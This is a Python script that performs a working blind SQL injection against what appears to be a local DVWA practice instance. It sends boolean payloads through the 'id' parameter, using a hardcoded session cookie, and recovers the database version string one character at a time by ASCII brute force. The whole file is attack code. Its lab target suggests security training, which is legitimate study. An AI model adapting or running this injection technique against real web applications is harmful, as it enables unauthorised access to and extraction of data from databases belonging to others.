from pyexpat import version_info
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

LIMIT = 100
PHPSESSID = "2q7sgh6jm4lrl5jamh53msagg2"
SECURITY = "low"


def get_db_version_len():
    '''Send a SQL attack and get the length of the db version'''
    # Loop until SQL command return True. Try untill 100. If not found, raise an error
    version_len = 0
    while True:
        version_len += 1
        base_url = "http://localhost:8080/vulnerabilities/sqli_blind/?id="
        query = f"1' and length(@@VERSION)={version_len}#"
        url = base_url + quote(query) + "&Submit=Submit#"
        cookies = {"PHPSESSID": PHPSESSID, "security": SECURITY}
        response = requests.post(url, cookies=cookies)

        # Parse response HTML and check if it returned True
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return version_len
        if version_len >= 100:
            raise ValueError(
                f'Tried {version_len} time but table len not found')


def get_db_ver_char_ascii(digit):
    '''Send a SQL attack and get a char of the db version'''
    target_ascii = 0
    while True:
        target_ascii += 1
        base_url = "http://localhost:8080/vulnerabilities/sqli_blind/?id="
        query = f"1' and ascii(substr(@@VERSION,{digit},1))={target_ascii} #"
        url = base_url + quote(query) + "&Submit=Submit#"
        cookies = {"PHPSESSID": PHPSESSID, "security": SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii > 127:
            raise ValueError(f'char not found on {digit}')


def get_db_ver(name_len):
    table_name = ""
    for idx in range(1, name_len + 1):
        table_name += get_db_ver_char_ascii(idx)
    return table_name


if __name__ == "__main__":
    db_version_len = get_db_version_len()
    print(db_version_len)
    print('-------------')
    db_version = get_db_ver(db_version_len)
    print(db_version)
